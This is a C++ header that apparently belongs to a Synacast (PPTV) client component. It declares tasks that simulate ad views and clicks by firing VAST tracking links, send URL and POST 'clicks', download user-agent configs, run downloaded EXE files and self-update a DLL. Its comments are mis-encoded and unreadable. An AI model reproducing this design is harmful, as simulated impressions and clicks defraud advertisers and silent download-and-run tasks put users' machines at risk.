#pragma once
#include <synacast/xdll/PacketBuilder.h>
#include "Task.h"
#include "AdConfig.h"
#include "LogVast.h"

extern HANDLE g_hAdsExitEvent;
//extern HANDLE g_hLoadUadetailsSucceed;

// ��ͨ���� ������������Httpͷ������������
class UrlClickingTask : public Task
{
public:
	explicit UrlClickingTask( const NormalTaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{

	}

	virtual void Run();

	NormalTaskInfo m_taskinfo;
};


//�������°汾��UaDetails.xml
class DownloadUAConfigTask : public Task
{
public:
	virtual void Run();
	
};

//���ؽ���httptask.ini
class GetIniConfigTask : public Task
{
public:
	GetIniConfigTask(DWORD msgThreadId) : m_msgThreadId(msgThreadId)//, m_useLeaf1(false)
	{
	}
	
	virtual void Run();
	
public:
	DWORD m_msgThreadId;
};


// POST���񣬾������Ȼ���������Post
class PostClickingTask : public Task
{
public:
	explicit PostClickingTask( const PostTaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{

	}

	virtual void Run();

	PostTaskInfo m_taskinfo;
};

// EXE��������EXE��ֱ��ִ��
class EXERunningTask : public Task
{
public:
	explicit EXERunningTask( const EXETaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{
	}

	virtual void Run();

	EXETaskInfo m_taskinfo;
};

// ��������������dll�������Լ�����
class UpdateRunningTask : public Task
{
public:
	explicit UpdateRunningTask( const UpdateTaskInfo& taskinfo ) : m_taskinfo( taskinfo )
	{
	}

	virtual void Run();

	UpdateTaskInfo m_taskinfo;
};

class IniFile;
class SimRunningTask : public Task
{
public:
	SimRunningTask(DWORD msgThreadId) : m_msgThreadId(msgThreadId)//, m_useLeaf1(false)
	{
	}

	virtual void Run() = 0;
	
	DWORD             m_msgThreadId;
	UINT			  m_taskDelayTime;	//����֮����ʱ�䣬��λ��s

public:
	enum TracklinkType
	{
		START_TRACK = 1,
		FIRST_QUARTER_TRACK,
		HALF_TRACK,
		THREE_QUARTER_TRACK,
		END_TRACK,
		CLICK_LINK,
		CLICK_TRACK
	};
protected:
	AdConfig m_adConfig;

	void SendLink(int nTrackType, vector<string>& Links, ADInfo& adinfo);
	void IntervalDetect(unsigned int periodCurrent, bool runClickLink, unsigned int beforeClick, ADInfo& adInfo);
	void RunAdConfig();
	void RunClickLink(IniFile& ini, string& link);
	bool RunClickLink(string& link, ADInfo& adInfo);
};

class ClientSimRunningTask : public SimRunningTask
{
public:
	ClientSimRunningTask(const ClientSimTaskInfo& taskinfo, DWORD msgThreadId);
	ClientSimRunningTask(const ClientExSimTaskInfo& taskinfo, DWORD msgThreadId);

	virtual void Run();

private:
	ClientSimTaskInfo m_taskinfo;
	CString m_strClientUrl;
	UINT16 m_isSecure;
};

class VASTSimRunningTask : public SimRunningTask
{
public:
	VASTSimRunningTask(const VASTSimTaskInfo& taskinfo, DWORD msgThreadId, UINT32 uDelayTime);
	VASTSimRunningTask(const VASTExSimTaskInfo& taskinfo, DWORD msgThreadID, UINT32 uDelayTime);

	void ReplaceJuid();		//�滻[juid]
	void ReplacePolicy();	//�滻[policy]
	void ReplaceVer();		//�滻[ver]
	virtual void Run();

public:
	LogVast m_VastGetLog;

private:
	CString m_strVastUrl;
	UINT16 m_isSecure;
};


//////////////////////////////////////////////////////////////////////////
/// �ύ��־������
class SendingLogTask : public Task
{
public:
	explicit SendingLogTask(const CString& url) : m_url(url)
	{
	}
	
	virtual void Run();

	CString m_url;
};

//////////////////////////////////////////////////////////////////////////
/// �ύ������־������
// class SendingStartLogTask : public Task
// {
// public:	
// 	virtual void Run();
// };


//////////////////////////////////////////////////////////////////////////
// �ӳ�ɾ������
template<typename T>
class DelayDeleteObjectTask : public Task
{
public:
	DelayDeleteObjectTask(T* object):m_object(object)
	{
	}

	virtual void Run()
	{
		if (m_object) {
			delete m_object;
		}
	}
protected:
	T* m_object;
};